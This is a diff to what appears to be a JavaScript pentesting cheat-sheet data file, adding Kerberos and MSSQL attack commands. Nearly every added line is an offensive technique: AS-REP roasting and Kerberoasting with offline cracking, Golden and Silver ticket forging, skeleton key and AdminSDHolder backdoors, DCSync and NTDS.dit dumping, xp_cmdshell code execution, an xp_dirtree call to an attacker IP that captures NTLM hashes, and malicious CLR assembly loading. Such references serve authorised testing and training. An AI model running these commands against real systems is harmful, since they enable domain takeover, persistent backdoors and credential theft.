         "kerbrute userenum --dc <IP> -d <DOMAIN> users.txt",
         "kerbrute passwordspray --dc <IP> -d <DOMAIN> users.txt 'Password123'",
-        "python3 GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <IP> -no-pass"
+        "python3 GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <IP> -no-pass",
+        "# Enumerate KDC via DNS SRV records\ndig _kerberos._tcp.<DOMAIN> SRV",
+        "# Detect Kerberos realm from TGT error\nimit kinit doesnotexist@<DOMAIN> 2>&1 | grep realm",
+        "# Check pre-authentication disabled users (AS-REP roasting targets)\nGetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile users.txt"
       ],
       "exploitation": [
         "# AS-REP Roasting (no pre-auth required)\npython3 GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <IP> -no-pass -outputfile asrep_hashes.txt\nhashcat -m 18200 asrep_hashes.txt rockyou.txt",
@@ -7369,18 +7814,29 @@ var HACKTRICKS_DATA = {
         "# Golden Ticket (requires krbtgt hash)\npython3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> administrator",
         "# Silver Ticket\npython3 ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn CIFS/<TARGET> administrator",
         "# Skeleton Key\nmsf> use exploit/windows/local/kerberos_skeleton_key",
-        "# Kerberos brute force\nkerbrute bruteuser --dc <IP> -d <DOMAIN> rockyou.txt <user>"
+        "# Kerberos brute force\nkerbrute bruteuser --dc <IP> -d <DOMAIN> rockyou.txt <user>",
+        "# AS-REP Roasting – offline crack hashes of no-preauth accounts\nGetNPUsers.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -format hashcat\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
+        "# Kerberoasting – request TGS for SPNs, crack offline\nGetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt",
+        "# Pass-the-Ticket (PTT) – inject stolen TGT\nexport KRB5CCNAME=/tmp/stolen.ccache\npsexec.py -k -no-pass <DOMAIN>/<USER>@<TARGET>",
+        "# Golden Ticket – forge TGT with KRBTGT hash (requires domain admin first)\nticket_converter.py  # or mimikatz kerberos::golden\nTicketer.py -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator",
+        "# Silver Ticket – forge service ticket without KDC\nTicketer.py -nthash <SERVICE_ACCOUNT_HASH> -domain-sid <SID> -domain <DOMAIN> -spn cifs/<TARGET_FQDN> Administrator",
+        "# Kerberos delegation abuse – unconstrained delegation\n# Find computers with unconstrained delegation:\nGet-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties *\n# Wait for DA to authenticate → extract TGT from lsass\n# Or trigger via SpoolSample/PetitPotam"
       ],
       "post_exploitation": [
         "# Extract all Kerberos tickets from memory (after shell)\nmimikatz # sekurlsa::tickets /export\nmimikatz # kerberos::list /export",
         "# DCSync (domain admin required)\npython3 secretsdump.py <DOMAIN>/<user>:<pass>@<DC_IP> -just-dc",
         "# Dump krbtgt hash for Golden Ticket\nmimikatz # lsadump::dcsync /user:krbtgt",
         "klist  # list current Kerberos tickets",
-        "cat /etc/krb5.conf 2>/dev/null"
+        "cat /etc/krb5.conf 2>/dev/null",
+        "# DCSync – dump all domain password hashes using replication protocol\nsecretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>\n# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All",
+        "# Persistence via skeleton key (patches lsass – password becomes 'mimikatz')\nmimikatz # privilege::debug\nmimikatz # misc::skeleton",
+        "# AdminSDHolder persistence – write ACL to AdminSDHolder container\n# Effects propagate to all protected groups every 60 minutes\nSet-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -PrincipalIdentity backdoor_user -Rights All"
       ],
       "other": [
         "# Kerberos ticket types: TGT (Ticket Granting Ticket), TGS (Service Ticket)\n# TGT obtained from KDC on port 88\n# TGS obtained from KDC using TGT",
-        "# Important SPN formats: CIFS/<host>, HTTP/<host>, MSSQLSvc/<host>:<port>"
+        "# Important SPN formats: CIFS/<host>, HTTP/<host>, MSSQLSvc/<host>:<port>",
+        "# Dump KRBTGT hash via volume shadow copy (without DC access via network)\nvssadmin create shadow /for=C:\\\nCopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\WINDOWS\\NTDS\\NTDS.dit C:\\exfil\\ntds.dit",
+        "# Credential harvesting: PKINIT abuse for certificate-based Kerberos auth\nRequest-Certificate.py -u <USER> -p <PASS> -ca <CA_SERVER> -template User -dc-ip <DC_IP>"
       ]
     }
   },
@@ -7466,7 +7922,9 @@ var HACKTRICKS_DATA = {
         "msf> use auxiliary/scanner/mssql/mssql_ping",
         "sqsh -S <IP>:<PORT> -U <user> -P <pass>",
         "impacket-mssqlclient <DOMAIN>/<user>:<pass>@<IP>",
-        "nxc mssql <IP> -u <user> -p <pass>"
+        "nxc mssql <IP> -u <user> -p <pass>",
+        "# MSSQL instance discovery via UDP 1434\nnmap -sU -p 1434 --script ms-sql-info <IP>",
+        "# Enumerate linked servers\nmsf> use auxiliary/admin/mssql/mssql_findandsampledata\n# Or impacket:\nmssqlclient.py sa:password@<IP> -windows-auth -q 'SELECT name FROM sys.servers'"
       ],
       "exploitation": [
         "# xp_cmdshell RCE\nimpacket-mssqlclient <user>:<pass>@<IP>\nEXEC xp_cmdshell 'whoami';",
@@ -7476,7 +7934,11 @@ var HACKTRICKS_DATA = {
         "# CLR assembly for RCE\nmsf> use exploit/windows/mssql/mssql_clr_payload",
         "# OLE Automation Objects\nEXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;\nDECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUT; EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\\\\out.txt'",
         "hydra -L users.txt -P passwords.txt mssql://<IP>",
-        "# MSSQL password spray\nnxc mssql <IP> -u users.txt -p passwords.txt --no-bruteforce"
+        "# MSSQL password spray\nnxc mssql <IP> -u users.txt -p passwords.txt --no-bruteforce",
+        "# xp_cmdshell RCE (if sysadmin)\nmssqlclient.py sa:password@<IP>\nSQL> EXEC xp_cmdshell 'whoami';\nSQL> EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
+        "# MSSQL UNC path injection for NTLM hash capture\nSQL> EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';  -- triggers SMB auth\n# Capture hash with Responder",
+        "# MSSQL linked server lateral movement\nSQL> SELECT * FROM OPENQUERY([LINKED_SERVER], 'SELECT SYSTEM_USER');\nSQL> EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];",
+        "# CLR assembly exec – bypass xp_cmdshell restrictions\n# Create malicious CLR DLL, load via CREATE ASSEMBLY\nmssqlclient.py sa:pass@<IP> -q \"CREATE ASSEMBLY payload FROM '<HEX_DLL>' WITH PERMISSION_SET=UNSAFE\""
       ],
       "post_exploitation": [
         "# Dump all databases and tables\nSELECT name FROM sys.databases;\nSELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;",
@@ -7484,12 +7946,17 @@ var HACKTRICKS_DATA = {
         "# Impersonate other logins\nEXECUTE AS LOGIN = 'sa';\nSELECT SYSTEM_USER;",
         "# Read Windows SAM via linked server or xp_cmdshell\nEXEC xp_cmdshell 'type C:\\Windows\\System32\\config\\SAM'",
         "find / -name '*.mdf' -o -name '*.ldf' 2>/dev/null  # MSSQL database files",
-        "cat /etc/mssql-server/mssql.conf 2>/dev/null"
+        "cat /etc/mssql-server/mssql.conf 2>/dev/null",
+        "# Dump all database connection strings from MSSQL registry\nSQL> EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\MSSQLServer\\Client\\ConnectTo','*';",
+        "# Extract all user hashes from MSSQL sys.sql_logins\nSQL> SELECT name, password_hash FROM sys.sql_logins;",
+        "# Enumerate Windows logins mapped to MSSQL\nSQL> SELECT l.name, l.type_desc, p.permission_name FROM sys.server_principals l JOIN sys.server_permissions p ON l.principal_id = p.grantee_principal_id WHERE l.type IN ('U','G');"
       ],
       "other": [
         "# MSSQL Windows auth via Kerberos\nimpacket-mssqlclient -windows-auth <DOMAIN>/<user>:<pass>@<IP>",
         "# MSSQL over named pipes (SMB)\nimpacket-mssqlclient <user>:<pass>@<IP> -p 1433",
-        "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS <IP>; run; exit'"
+        "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS <IP>; run; exit'",
+        "# MSSQL password spray with netexec\nnetexec mssql <IP> -u users.txt -p passwords.txt --continue-on-success",
+        "# Check SQL Agent jobs for credential exposure\nSQL> SELECT job_id, name, command FROM msdb.dbo.sysjobsteps WHERE command LIKE '%password%';"
       ]
     }
   },
